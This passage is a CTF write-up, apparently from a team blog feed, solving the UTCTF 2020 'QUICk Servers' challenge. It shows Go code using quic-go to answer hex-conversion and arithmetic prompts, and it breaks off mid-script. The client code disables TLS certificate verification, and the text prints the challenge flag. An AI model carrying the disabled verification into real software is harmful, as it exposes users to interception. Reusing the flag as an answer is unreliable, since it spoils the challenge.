      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="fireshell2020" scheme="https://teamrocketist.github.io/tags/fireshell2020/"/>
    
  </entry>
  
  <entry>
    <title>[Network] UTCTF 2020 - QUICk Servers</title>
    <link href="https://teamrocketist.github.io/2020/03/11/Network-UTCTF-2020-QUICk-Servers/"/>
    <id>https://teamrocketist.github.io/2020/03/11/Network-UTCTF-2020-QUICk-Servers/</id>
    <published>2020-03-11T11:43:02.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>QUICk Servers</p></blockquote><blockquote><p><strong>Solves</strong>: 17</p><p><strong>Points</strong>: 1988   </p><p><strong>Description</strong>:<br>I have a pretty cool server, but it’s for QUICk people only. Nobody else is allowed.</p><p>Pro Tip: Set your ALPN to “quic-echo-example” because I forgot to remove it.</p><p>54.152.23.18:1337</p><p><strong>Author</strong>: masond</p></blockquote><h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h3><p>I didn’t solve the challenge during the ctf mainly because my lack of experience with <strong>golang</strong> and also my ability to identify the issues was affected by the lack of sleeping. Anyway this was a cool challenge made me learn about the <strong>QUIC</strong> protocol and some new things about the <strong>go</strong> language.</p><p>The title of the challenge gives us the hint that this may be a server running on the <strong>QUIC</strong> protocol also in the description we were given the ip and port to the server.</p><p>Initially I tried to use a python library for <strong>quick</strong> but I failed horribly when connecting to the server, by searching the the hint of setting the APLN to “quic-echo-example” on github I ended up searching some examples on how to connect to a <strong>QUIC</strong> server using a library named <a href="https://github.com/lucas-clemente/quic-go" target="_blank" rel="noopener">quick-go</a> .</p><p>So what exactly is <strong>QUIC</strong>? Quic is a network-protocol designed by <strong>Jim Roskind</strong> at Google, it was mainly created to improve the <strong>performance</strong>  of connection-oriented <strong>web applications</strong> using the <strong>UDP protocol</strong> instead of <strong>TCP</strong>.</p><h3 id="Finding-an-example"><a href="#Finding-an-example" class="headerlink" title="Finding an example"></a>Finding an example</h3><p>By searching by “quic-echo-example” on github I found an <a href="https://github.com/kangyanf2008/go_grpc/blob/d7a3e3e03fc9c517dfed5ef229f2135e37f92e84/server/src/github.com/lucas-clemente/quic-go/example/echo/echo.go" target="_blank" rel="noopener">example</a>. </p><p>After this I adapted the source code to connect to the challenge server but I ended up finding a lot of difficulties during of the installation of <strong>quick-go</strong> lib, every time I tried to install it with <strong>go get .</strong> command I was receiving an odd error about a <strong>“Duplicate stream ID”</strong>. Spent a lot of time searching on the web for this and found nothing. </p><p>In the end, I ended finding out why I was having problems, I was trying to install the master branch of github and it required 1.14 version of <strong>golang</strong>… In my host machine I only had the 1.13 installed. To solve this problem I decided to use <a href="https://hub.docker.com/_/golang" target="_blank" rel="noopener">Docker</a>.</p><p>By specifying the right version as the tag I could use the right version of golang:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls </span><br><span class="line">main.go</span><br><span class="line">$ sudo docker run --rm -v $(<span class="built_in">pwd</span>):/go/src/myapp -w /go/src/myapp -it golang:1.14 /bin/bash</span><br></pre></td></tr></table></figure><p>After this I run into another problem I installed the master branch release which is unstable as fuck and also incompatible with the one running on the server. This is was when I learned about <strong>go modules</strong>, we can specify the right version with it so I searched in the github <a href="https://github.com/lucas-clemente/quic-go/releases" target="_blank" rel="noopener">releases</a> and the last stable release is <strong>v0.14.0</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ go mod init .</span><br><span class="line">$ go mod edit -require github.com/lucas-clemente/quic-go@v0.14.0</span><br><span class="line">$ go get -v -t .</span><br><span class="line">$ go build</span><br><span class="line">$ go install</span><br><span class="line">$ cat go.mod </span><br><span class="line">module myapp</span><br><span class="line"></span><br><span class="line">go 1.14</span><br><span class="line"></span><br><span class="line">require github.com/lucas-clemente/quic-go v0.14.0</span><br></pre></td></tr></table></figure><p>And finally I was able to connect to the server:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go run main.go</span><br><span class="line">Client: Sending &apos;feqfq&apos;</span><br><span class="line">Maybe you should start with Hello...</span><br></pre></td></tr></table></figure><p>So the server replies that we should start with <strong>Hello</strong>, first we do the TLS configuration and specify the nextProtos as “quic-echo-example” as specified in the challenge description:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tlsConf := &amp;tls.Config&#123;</span><br><span class="line">   InsecureSkipVerify: <span class="literal">true</span>,</span><br><span class="line">   NextProtos:         []<span class="keyword">string</span>&#123;<span class="string">"quic-echo-example"</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then we create the connection and the stream:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">session, err := quic.DialAddr(addr, tlsConf, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stream, err := session.OpenStreamSync(context.Background())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Sending the hello message and receiving the response:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readBytes</span><span class="params">(stream io.Reader, n <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt; n; i++ &#123;</span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">1</span>)</span><br><span class="line">    _, err := io.ReadFull(stream, buf);</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"%s"</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"Client: Sending '%s'\n"</span>, message)</span><br><span class="line">_, err = io.WriteString(stream,message)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = readBytes(stream, <span class="number">248</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ go run main.go</span><br><span class="line">Client: Sending <span class="string">'Hello'</span></span><br><span class="line">Welcome to the super QUICk Server!</span><br><span class="line">You might<span class="string">'ve thought getting the flag would be easy, but it'</span>s gonna take a bit more. :D</span><br><span class="line"></span><br><span class="line">I need some <span class="built_in">help</span> with my Computer Architecture class, could you give me these numbers back <span class="keyword">in</span> hex?</span><br><span class="line">123454</span><br></pre></td></tr></table></figure><p>This is the first hand of questions and is about converting decimal integers to hexa, this is where I got stuck mainly because I didn’t understand really well how <strong>golang</strong> read stream functions worked. The problem was on the <strong>number extraction</strong>, I was reading the <strong>last</strong> line with the number, but <strong>some</strong> times the number to be converted had <strong>less</strong> than 6 numbers and this is where I <strong>failed</strong> to understand the problem, when less than 6 the last line would be presented as <strong>“1234  \n”</strong> with spaces between the <strong>numbers</strong> and the <strong>new line</strong>, I was <strong>only</strong> striping the new line, because of this when sending the answer to the server everything started to hang up. </p><p>After the CTF and a day of rest I found out about the spaces and took <strong>another approach</strong>, something that I should have used since the beginning, which is using <strong>regex</strong> to extract those numbers instead of parsing them by <strong>“hand”</strong>.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">toHex</span><span class="params">(x []<span class="keyword">byte</span>, n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    re := regexp.MustCompile(<span class="string">"[0-9]+"</span>)</span><br><span class="line">    h,err := strconv.Atoi(re.FindString(<span class="keyword">string</span>(x)))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">"%x"</span>, h)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>; i&lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">    num := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">7</span>)</span><br><span class="line">    n, err := stream.Read(num);</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    s := <span class="string">"0x"</span>+toHex(num,n)</span><br><span class="line">    <span class="comment">//fmt.Printf("%d\n", i)</span></span><br><span class="line">    <span class="comment">//fmt.Printf("Received %s", num);</span></span><br><span class="line">    <span class="comment">//fmt.Printf("Sending %s\n",s)</span></span><br><span class="line">    <span class="comment">//_,err = io.WriteString(stream,s)</span></span><br><span class="line">    _, err = stream.Write([]<span class="keyword">byte</span>(s))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">b, err := ioutil.ReadAll(stream)</span><br><span class="line">fmt.Printf(<span class="string">"%s\n"</span>, b)</span><br></pre></td></tr></table></figure><p>After converting 1000 decimal numbers we get the respective answer:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ go run main.go</span><br><span class="line">Client: Sending <span class="string">'Hello'</span></span><br><span class="line">Welcome to the super QUICk Server!</span><br><span class="line">You might<span class="string">'ve thought getting the flag would be easy, but it'</span>s gonna take a bit more. :D</span><br><span class="line"></span><br><span class="line">I need some <span class="built_in">help</span> with my Computer Architecture class, could you give me these numbers back <span class="keyword">in</span> hex?</span><br><span class="line">Quickly, of course... :)</span><br><span class="line">Nice job, <span class="built_in">let</span><span class="string">'s keep going...</span></span><br><span class="line"><span class="string">Can I dial you later? I'</span>ll try 6969 ;)</span><br></pre></td></tr></table></figure><p>This time the server is trying to connect to us, so we need to turn us into a <strong>“server”</strong> and listen at the port <strong>6969</strong>, for this we need to open a port in the router and rerun the docker container with the <strong>-p</strong> parameter to link the <strong>UDP</strong> port with the host:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run --rm -p 6969:6969/udp -v (<span class="built_in">pwd</span>):/go/src/myapp -w /go/src/myapp -it golang:1.14 /bin/bash</span><br><span class="line">$ go mod init .</span><br><span class="line">$ go mod edit -require github.com/lucas-clemente/quic-go@v0.14.0</span><br><span class="line">$ go get -v -t .</span><br><span class="line">$ go build</span><br><span class="line">$ go install</span><br></pre></td></tr></table></figure><p>Also if you have a local firewall like I have in my computer you need to open that door too, in my case I use <strong>UFW firewall</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ufw allow 6969/udp</span><br><span class="line">$ sudo ufw status</span><br><span class="line">6969/udp                   ALLOW       Anywhere                  </span><br><span class="line">6969/udp (v6)              ALLOW       Anywhere (v6)</span><br></pre></td></tr></table></figure><p>To run the server we need to put it in another <strong>thread</strong>, we can use <strong>go-coroutines</strong> but we also have to add a code that waits for the server thread to end before quitting the main program, this can be pretty easily done with <strong>go</strong> by using <strong>sync.WaitGroup</strong>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">  wg.Add(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; log.Fatal(echoServer()) &#125;()</span><br><span class="line">  err := clientMain()</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="built_in">panic</span>(err)</span><br><span class="line">  &#125;</span><br><span class="line">  wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the code above <strong>go func()</strong> initiates the server coroutine and increases the <strong>WaitGroup</strong> counter, we put a <strong>Wait()</strong> in the end of the main function so it waits until the counter reaches the number zero. This happens when <strong>echoServer()</strong> finishes which will decrease the counter to zero.</p><p>Making the server listening at <strong>0.0.0.0:6969</strong> and set up TLS configurations:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echoServer</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    listener, err := quic.ListenAddr(addrClientS, generateTLSConfig(), <span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    sess, err := listener.Accept(context.Background())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    stream, err := sess.AcceptStream(context.Background())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = readBytes(stream, <span class="number">26</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Setup a bare-bones TLS config for the server</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateTLSConfig</span><span class="params">()</span> *<span class="title">tls</span>.<span class="title">Config</span></span> &#123;</span><br><span class="line">    key, err := rsa.GenerateKey(rand.Reader, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    template := x509.Certificate&#123;SerialNumber: big.NewInt(<span class="number">1</span>)&#125;</span><br><span class="line">    certDER, err := x509.CreateCertificate(rand.Reader, &amp;template, &amp;template, &amp;key.PublicKey, key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    keyPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: <span class="string">"RSA PRIVATE KEY"</span>, Bytes: x509.MarshalPKCS1PrivateKey(key)&#125;)</span><br><span class="line">    certPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: <span class="string">"CERTIFICATE"</span>, Bytes: certDER&#125;)</span><br><span class="line"></span><br><span class="line">    tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;tls.Config&#123;</span><br><span class="line">        Certificates: []tls.Certificate&#123;tlsCert&#125;,</span><br><span class="line">        NextProtos:   []<span class="keyword">string</span>&#123;<span class="string">"quic-echo-example"</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reading the next problem:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">err = readBytes(stream, <span class="number">26</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The next problem is to calculate expressions:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hey... you up?</span><br><span class="line">Math time!</span><br><span class="line">123458 + 341231</span><br></pre></td></tr></table></figure><p>Once again using regex to extract everything:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echoServer</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">        num := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">0x30</span>)</span><br><span class="line">        _, err = stream.Read(num);</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        re := regexp.MustCompile(<span class="string">"[0-9]+"</span>)</span><br><span class="line">        re2 := regexp.MustCompile(<span class="string">"[-+*/^&amp;]"</span>)</span><br><span class="line">        num1,_ := strconv.Atoi(re.FindAllString(<span class="keyword">string</span>(num),<span class="number">-1</span>)[<span class="number">0</span>])</span><br><span class="line">        num2,_ := strconv.Atoi(re.FindAllString(<span class="keyword">string</span>(num),<span class="number">-1</span>)[<span class="number">1</span>])</span><br><span class="line">        exp := re2.FindString(<span class="keyword">string</span>(num))</span><br><span class="line">        <span class="comment">//fmt.Printf("%s\n", num)</span></span><br><span class="line">        <span class="comment">//fmt.Printf("%d\n", num1)</span></span><br><span class="line">        <span class="comment">//fmt.Printf("%s\n", exp)</span></span><br><span class="line">        <span class="comment">//fmt.Printf("%d\n", num2)</span></span><br><span class="line">        res := calculateExp(num1, num2, exp)</span><br><span class="line">        <span class="comment">//fmt.Printf("%d\n", res)</span></span><br><span class="line">        _,err = io.WriteString(stream,strconv.Itoa(res))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    b, err := ioutil.ReadAll(stream)</span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After calculating 1000 expressions we get the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Great Job!</span><br><span class="line">utflag&#123;Qu1C_p@cK3t<span class="variable">$_a73jc8s</span>&#125;</span><br></pre></td></tr></table></figure><p>The full script:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"context"</span></span><br><span class="line">    <span class="comment">//"encoding/binary"</span></span><br><span class="line">    <span class="string">"crypto/rand"</span></span><br><span class="line">    <span class="string">"crypto/rsa"</span></span><br><span class="line">    <span class="string">"crypto/tls"</span></span><br><span class="line">    <span class="string">"regexp"</span></span><br><span class="line">    <span class="string">"strconv"</span></span><br><span class="line">    <span class="string">"sync"</span></span><br><span class="line">    <span class="comment">//"time"</span></span><br><span class="line">    <span class="comment">//"strings"</span></span><br><span class="line">    <span class="string">"crypto/x509"</span></span><br><span class="line">    <span class="string">"encoding/pem"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"math/big"</span></span><br><span class="line"></span><br><span class="line">    quic <span class="string">"github.com/lucas-clemente/quic-go"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">"192.168.1.3:1337"</span><span class="comment">//"54.152.23.18:1337"</span></span><br><span class="line"><span class="keyword">const</span> addrClientS = <span 